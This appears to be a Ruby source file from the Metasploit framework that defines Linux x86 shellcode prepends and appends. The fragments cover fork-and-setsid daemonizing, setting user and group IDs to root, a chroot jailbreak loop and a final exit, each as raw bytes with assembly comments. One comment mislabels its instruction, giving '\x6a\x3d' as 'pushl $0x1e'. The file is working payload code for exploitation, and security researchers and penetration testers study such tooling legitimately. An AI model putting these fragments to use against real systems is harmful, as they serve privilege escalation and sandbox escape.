#
# Linux x86 prepends
#
module Msf::Payload::Linux::X86::Prepends
  include Msf::Payload::Linux::Prepends
  def prepends_order
    %w[PrependFork PrependSetresuid PrependSetreuid PrependSetuid PrependSetresgid PrependSetregid PrependSetgid PrependChrootBreak]
  end

  def appends_order
    %w[AppendExit]
  end

  def prepends_map
    {
      'PrependFork' => "\x6a\x02" + #   pushb   $0x2                       #
        "\x58" + #   popl    %eax                       #
        "\xcd\x80" + #   int     $0x80       ; fork         #
        "\x85\xc0" + #   test    %eax,%eax                  #
        "\x74\x06" + #   jz      loc_000f                   #
        # loc_0009:
        "\x31\xc0" + #   xor     %eax,%eax                  #
        "\xb0\x01" + #   movb    $0x1,%al                   #
        "\xcd\x80" + #   int     $0x80       ; exit         #
        # loc_000f:
        "\xb0\x42" + #   movb    %0x42,%al                  #
        "\xcd\x80" + #   int     $0x80       ; setsid       #
        "\x6a\x02" + #   pushb   $0x2                       #
        "\x58" + #   popl    %eax                       #
        "\xcd\x80" + #   int     $0x80       ; fork         #
        "\x85\xc0" + #   test    %eax,%eax                  #
        "\x75\xed", #   jnz     loc_0009                   #

      # setresuid(0, 0, 0)
      'PrependSetresuid' => "\x31\xc9" + #   xorl    %ecx,%ecx                  #
        "\x31\xdb" + #   xorl    %ebx,%ebx                  #
        "\xf7\xe3" + #   mull    %ebx                       #
        "\xb0\xa4" + #   movb    $0xa4,%al                  #
        "\xcd\x80", #   int     $0x80                      #

      # setreuid(0, 0)
      'PrependSetreuid' => "\x31\xc9" + #   xorl    %ecx,%ecx                  #
        "\x31\xdb" + #   xorl    %ebx,%ebx                  #
        "\x6a\x46" + #   pushl   $0x46                      #
        "\x58" + #   popl    %eax                       #
        "\xcd\x80", #   int     $0x80                      #

      # setuid(0)
      'PrependSetuid' => "\x31\xdb" + #   xorl    %ebx,%ebx                  #
        "\x6a\x17" + #   pushl   $0x17                      #
        "\x58" + #   popl    %eax                       #
        "\xcd\x80", #   int     $0x80                      #

      # setresgid(0, 0, 0)
      'PrependSetresgid' => "\x31\xc9" + #   xorl    %ecx,%ecx                  #
        "\x31\xdb" + #   xorl    %ebx,%ebx                  #
        "\xf7\xe3" + #   mull    %ebx                       #
        "\xb0\xaa" + #   movb    $0xaa,%al                  #
        "\xcd\x80", #   int     $0x80                      #

      # setregid(0, 0)
      'PrependSetregid' => "\x31\xc9" + #   xorl    %ecx,%ecx                  #
        "\x31\xdb" + #   xorl    %ebx,%ebx                  #
        "\x6a\x47" + #   pushl   $0x47                      #
        "\x58" + #   popl    %eax                       #
        "\xcd\x80", #   int     $0x80                      #

      # setgid(0)
      'PrependSetgid' => "\x31\xdb" + #   xorl    %ebx,%ebx                  #
        "\x6a\x2e" + #   pushl   $0x2e                      #
        "\x58" + #   popl    %eax                       #
        "\xcd\x80", #   int     $0x80                      #

      # setreuid(0, 0) = break chroot
      'PrependChrootBreak' => "\x31\xc9" + #   xorl    %ecx,%ecx                  #
        "\x31\xdb" + #   xorl    %ebx,%ebx                  #
        "\x6a\x46" + #   pushl   $0x46                      #
        "\x58" + #   popl    %eax                       #
        "\xcd\x80" + #   int     $0x80                      #
        "\x6a\x3d" + #   pushl  $0x3d                       #
        # build dir str (ptr in ebx)
        "\x89\xe3" + #   movl   %esp,%ebx                   #
        # mkdir(dir)
        "\x6a\x27" + #   pushl  $0x27                       #
        "\x58" + #   popl   %eax                        #
        "\xcd\x80" + #   int     $0x80                      #
        # chroot(dir)
        "\x89\xd9" + #   movl   %ebx,%ecx                   #
        "\x58" + #   popl   %eax                        #
        "\xcd\x80" + #   int     $0x80                      #
        # build ".." str (ptr in ebx)
        "\x31\xc0" + #   xorl   %eax,%eax                   #
        "\x50" + #   pushl  %eax                        #
        "\x66\x68\x2e\x2e" + #   pushw  $0x2e2e                     #
        "\x89\xe3" + #   movl   %esp,%ebx                   #
        # loop changing dir
        "\x6a\x3d" + #   pushl  $0x1e                       #
        "\x59" + #   popl   %ecx                        #
        "\xb0\x0c" + #   movb   $0xc,%al                    #
        "\xcd\x80" + #   int     $0x80                      #
        "\xe2\xfa" + #   loop   -6                          #
        # final chroot
        "\x6a\x3d" + #   pushl  $0x3d                       #
        "\x89\xd9" + #   movl   %ebx,%ecx                   #
        "\x58" + #   popl   %eax                        #
        "\xcd\x80" #   int     $0x80                      #
    }
  end

  def appends_map
    {
      # exit(0)
      'AppendExit' => "\x31\xdb" + #   xorl    %ebx,%ebx                 #
        "\x6a\x01" + #   pushl   $0x01                     #
        "\x58" + #   popl    %eax                      #
        "\xcd\x80" #   int     $0x80                     #
    }
  end
end
